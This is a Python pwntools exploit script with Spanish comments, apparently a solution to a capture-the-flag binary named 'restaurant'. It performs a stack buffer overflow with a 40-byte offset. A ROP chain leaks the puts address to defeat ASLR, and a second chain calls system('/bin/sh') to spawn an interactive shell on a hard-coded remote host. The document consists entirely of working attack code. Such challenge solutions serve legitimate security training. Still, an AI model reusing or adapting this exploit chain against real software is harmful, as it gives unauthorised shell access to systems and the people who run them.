from pwn import *

context.binary = exe = ELF("restaurant", checksec=False)
#context.log_level = "debug"

# Primera fase
if args.REMOTE:
    io = remote("154.57.164.70", 41591)                 # <- datos del reto
    libc = ELF("./libc.so.6", checksec=False)  # la libc del reto (coincide con el remoto)
else:
    io = process("./restaurant")
    libc = ELF(io.libc.path, checksec=False)   # la libc del sistema que corre en local

io.sendlineafter(b"> ", b"1")

rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
# Payload para obtener la direccion real de puts.
# Offset = 40: buffer en rbp-0x20 (32 bytes) + 8 del saved RBP.
payload1 = flat(
    b"A" * 40,
    pop_rdi,
    exe.got['puts'],
    exe.plt['puts'],
    exe.sym['fill'],
)
io.sendlineafter(b"> ", payload1)

# printf hace eco del payload; la direccion de puts son los 6 bytes
# justo antes del '\n' que agrega puts.
io.recvuntil(b"Enjoy your ")
leak = u64(io.recvline().rstrip(b"\n")[-6:].ljust(8, b"\x00"))
libc_base = leak - libc.sym['puts']
assert libc_base & 0xfff == 0, f"base no alineada: {hex(libc_base)}"
log.info("leak puts  = %#x", leak)
log.info("libc base  = %#x", libc_base)

# Payload para obtener la direccion a system() y ejecutarlo con "/bin/sh" como parametro
libc.address = libc_base              # reubica toda la libc; ahora sym/search dan direcciones reales
system = libc.sym['system']
bin_sh = next(libc.search(b"/bin/sh"))   # busca la CADENA, no un gadget de instrucciones

payload2 = flat(
    b"A" * 40,
    ret,                              # alineacion de pila a 16 bytes (movaps en system)
    pop_rdi,
    bin_sh,
    system,
)

# Volvemos a fill() (retornamos ahi en la fase 1), que reimprime su "> " directamente.
io.sendlineafter(b"> ", payload2)
io.interactive()